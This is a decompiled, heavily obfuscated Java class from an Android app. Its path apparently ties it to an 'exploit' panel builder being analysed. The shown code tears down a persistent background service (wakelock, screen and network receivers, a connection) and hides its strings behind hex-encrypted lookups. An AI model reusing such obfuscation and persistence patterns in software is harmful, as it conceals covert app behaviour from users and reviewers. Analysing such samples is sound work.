package v.s;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.SystemClock;
import app.mobilex.plus.services.HelperHRAdapter$registerScreenStateReceiver$1;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import com.google.firebase.components.ComponentRegistrar;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executor;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class fadfsJa4iEdiwEC4Xm8 implements As2k35rSTTZ3RAUS, qrp1qtE91LqdmL, LtzmUxGUgkaP2P4zmQl6, bYZKmsM130y5GVhnn {
    public static fadfsJa4iEdiwEC4Xm8 gmNWMfvn6zlEj;
    public static fadfsJa4iEdiwEC4Xm8 vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;
    public static final fadfsJa4iEdiwEC4Xm8 JXn4Qf7zpnLjP5 = new fadfsJa4iEdiwEC4Xm8(1);
    public static final fadfsJa4iEdiwEC4Xm8 Ee8d2j4S9Vm5yGuR = new fadfsJa4iEdiwEC4Xm8(2);
    public static final fadfsJa4iEdiwEC4Xm8 xDyLpEZyrcKVe0 = new fadfsJa4iEdiwEC4Xm8(3);
    public static final fadfsJa4iEdiwEC4Xm8 ibVTtJUNfrGYbW = new fadfsJa4iEdiwEC4Xm8(4);
    public static final /* synthetic */ fadfsJa4iEdiwEC4Xm8 b1EoSIRjJHO5 = new fadfsJa4iEdiwEC4Xm8(5);
    public static final fadfsJa4iEdiwEC4Xm8 pyu8ovAipBTLYAiKab = new fadfsJa4iEdiwEC4Xm8(6);
    public static final fadfsJa4iEdiwEC4Xm8 D5P1xCAyuvgF = new fadfsJa4iEdiwEC4Xm8(7);
    public static final /* synthetic */ fadfsJa4iEdiwEC4Xm8 hjneShqpF9Tis4 = new fadfsJa4iEdiwEC4Xm8(8);

    public /* synthetic */ fadfsJa4iEdiwEC4Xm8(int i) {
        this.w9sT1Swbhx3hs = i;
    }

    public static void D5P1xCAyuvgF() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
        if (rWY6BVSB0XxPbw != null) {
            TypefaceCache.obtain("0007007F0048008400FF00B100DC00A2002000620052008900F700F1009C00E9");
            rWY6BVSB0XxPbw.ibVTtJUNfrGYbW = false;
            rWY6BVSB0XxPbw.gmNWMfvn6zlEj = false;
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            SyncQYAdapter syncQYAdapter = SyncQYAdapter.VEkRsTDS6a9oHWI;
            if (syncQYAdapter != null) {
                syncQYAdapter.getSharedPreferences(SyncQYAdapter.XuO9PPFo607ssKwZjNW, 0).edit().putBoolean(SyncQYAdapter.hV4VTKNUdeHN, false).putInt(SyncQYAdapter.k84rwRrqzhrNQ1CdNQ9, 50).apply();
            }
            rWY6BVSB0XxPbw.bbLLF31we2Iu.ibVTtJUNfrGYbW();
            rWY6BVSB0XxPbw.k84rwRrqzhrNQ1CdNQ9(true, true);
            PowerManager.WakeLock wakeLock = rWY6BVSB0XxPbw.JW3Lh9hxwLsO2ArTlH;
            if (wakeLock != null && wakeLock.isHeld()) {
                PowerManager.WakeLock wakeLock2 = rWY6BVSB0XxPbw.JW3Lh9hxwLsO2ArTlH;
                if (wakeLock2 != null) {
                    wakeLock2.release();
                }
                TypefaceCache.obtain("001400770050008200DC00B000D100AC00630064005E008B00F500BE00C100A20027");
            }
            try {
                HelperHRAdapter$registerScreenStateReceiver$1 helperHRAdapter$registerScreenStateReceiver$1 = rWY6BVSB0XxPbw.dQC4QhgRN3MSEAP3HW0;
                if (helperHRAdapter$registerScreenStateReceiver$1 != null) {
                    rWY6BVSB0XxPbw.dDIMxZXP1V8HdM.unregisterReceiver(helperHRAdapter$registerScreenStateReceiver$1);
                }
            } catch (Exception unused) {
            }
            rWY6BVSB0XxPbw.dQC4QhgRN3MSEAP3HW0 = null;
            try {
                MxCEVftHI6nm mxCEVftHI6nm = rWY6BVSB0XxPbw.GiffeZJ1rbwyx;
                if (mxCEVftHI6nm != null) {
                    Thread.currentThread().getName();
                    Object systemService = rWY6BVSB0XxPbw.dDIMxZXP1V8HdM.getSystemService("connectivity");
                    ConnectivityManager connectivityManager = systemService instanceof ConnectivityManager ? (ConnectivityManager) systemService : null;
                    if (connectivityManager != null) {
                        connectivityManager.unregisterNetworkCallback(mxCEVftHI6nm);
                        rWY6BVSB0XxPbw.GiffeZJ1rbwyx = null;
                    }
                }
            } catch (Exception unused2) {
            }
            rWY6BVSB0XxPbw.uCN4HERvZEfG7JjL = false;
            try {
                rWY6BVSB0XxPbw.n8nqApvKDYz7s8llJ2jf.shutdownNow();
            } catch (Exception unused3) {
            }
            try {
                rWY6BVSB0XxPbw.J0zjQ7CAgohuxU20eCW6.shutdownNow();
            } catch (Exception unused4) {
            }
            try {
                J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = rWY6BVSB0XxPbw.vekpFI4d1Nc4fakF;
                if (j1m0XraSkScfWFMIlTC != null) {
                    j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("0000007A0052008200FE00AB009200A3002A00650058008800FE00B100D700A40037"), 1000);
                }
            } catch (Exception e) {
                TypefaceCache.obtain("0007007F0048008400FF00B100DC00A200200062001B008200E200AD00DD00B500790036");
                e.getMessage();
            }
            rWY6BVSB0XxPbw.vekpFI4d1Nc4fakF = null;
            rWY6BVSB0XxPbw.xDyLpEZyrcKVe0 = false;
        }
        RWY6BVSB0XxPbw.GUsyOYEIobMSb6n = null;
    }

    public static XslKUngIJyofTLpQ5 Ee8d2j4S9Vm5yGuR(String str) {
        XslKUngIJyofTLpQ5 xslKUngIJyofTLpQ5 = new XslKUngIJyofTLpQ5(str.getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
        xslKUngIJyofTLpQ5.JXn4Qf7zpnLjP5 = str;
        return xslKUngIJyofTLpQ5;
    }

    public static XslKUngIJyofTLpQ5 ibVTtJUNfrGYbW(byte[] bArr) {
        int length = bArr.length;
        OFtLBiBbrrTHWu.vekpFI4d1Nc4fakF(bArr.length, 0, length);
        SbxdZ6Kq2uhHQ5RPRqm.hjneShqpF9Tis4(length, bArr.length);
        return new XslKUngIJyofTLpQ5(Arrays.copyOfRange(bArr, 0, length));
    }

    private static /* synthetic */ void lcoajihle() {
    }

    public static void pyu8ovAipBTLYAiKab(Context context, String str, String str2) {
        D5P1xCAyuvgF();
        RWY6BVSB0XxPbw.GUsyOYEIobMSb6n = new RWY6BVSB0XxPbw(context, str);
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
        if (rWY6BVSB0XxPbw != null) {
            rWY6BVSB0XxPbw.ibVTtJUNfrGYbW(str2);
        }
    }

    public static XslKUngIJyofTLpQ5 vekpFI4d1Nc4fakF(String str) {
        if (str.length() % 2 != 0) {
            throw new IllegalArgumentException("Unexpected hex string: ".concat(str).toString());
        }
        int length = str.length() / 2;
        byte[] bArr = new byte[length];
        for (int i = 0; i < length; i++) {
            int i2 = i * 2;
            bArr[i] = (byte) (OFMrQsTe5s1KYV0lq.dDIMxZXP1V8HdM(str.charAt(i2 + 1)) + (OFMrQsTe5s1KYV0lq.dDIMxZXP1V8HdM(str.charAt(i2)) << 4));
        }
        return new XslKUngIJyofTLpQ5(bArr);
    }

    /* JADX WARN: Type inference failed for: r1v1, types: [boolean, int] */
    public static boolean xDyLpEZyrcKVe0() {
        ?? r1;
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
        if (rWY6BVSB0XxPbw == null || rWY6BVSB0XxPbw.xDyLpEZyrcKVe0 != (r1 = (-75) + 76)) {
            return false;
        }
        return r1;
    }

    @Override // v.s.bYZKmsM130y5GVhnn
    public long JXn4Qf7zpnLjP5() {
        return SystemClock.elapsedRealtime();
    }

    public List b1EoSIRjJHO5(ComponentRegistrar componentRegistrar) {
        ArrayList arrayList = new ArrayList();
        for (FVxyDmZ6Vklq5C fVxyDmZ6Vklq5C : componentRegistrar.getComponents()) {
            String str = fVxyDmZ6Vklq5C.dDIMxZXP1V8HdM;
            if (str != null) {
                fVxyDmZ6Vklq5C = new FVxyDmZ6Vklq5C(str, fVxyDmZ6Vklq5C.w9sT1Swbhx3hs, fVxyDmZ6Vklq5C.vekpFI4d1Nc4fakF, fVxyDmZ6Vklq5C.JXn4Qf7zpnLjP5, fVxyDmZ6Vklq5C.Ee8d2j4S9Vm5yGuR, new cY0DNVJM1fAUrMWIl7k(str, 0, fVxyDmZ6Vklq5C), fVxyDmZ6Vklq5C.ibVTtJUNfrGYbW);
            }
            arrayList.add(fVxyDmZ6Vklq5C);
        }
        return arrayList;
    }

    @Override // v.s.LtzmUxGUgkaP2P4zmQl6
    public SQzPENpgvzKX9IlD dDIMxZXP1V8HdM(Object obj) {
        Bundle bundle = (Bundle) obj;
        int i = OfLkl9rR9exIS.b1EoSIRjJHO5;
        return (bundle == null || !bundle.containsKey("google.messenger")) ? SbxdZ6Kq2uhHQ5RPRqm.wotphlvK9sPbXJ(bundle) : SbxdZ6Kq2uhHQ5RPRqm.wotphlvK9sPbXJ(null);
    }

    @Override // v.s.As2k35rSTTZ3RAUS
    public Object w9sT1Swbhx3hs(iniVyKd0OGb2raI4 inivykd0ogb2rai4) {
        switch (this.w9sT1Swbhx3hs) {
            case 3:
                return new rPTA1zWZR3GTVlGPw((Executor) inivykd0ogb2rai4.vekpFI4d1Nc4fakF(new QwPxr2jx1iGLmehgkv3g(ZWT4Q2gfG7cBDIhWQsfN.class, Executor.class)));
            default:
                return new rPTA1zWZR3GTVlGPw((Executor) inivykd0ogb2rai4.vekpFI4d1Nc4fakF(new QwPxr2jx1iGLmehgkv3g(rvAS0S3hc9OcOpI2kG.class, Executor.class)));
        }
    }
}
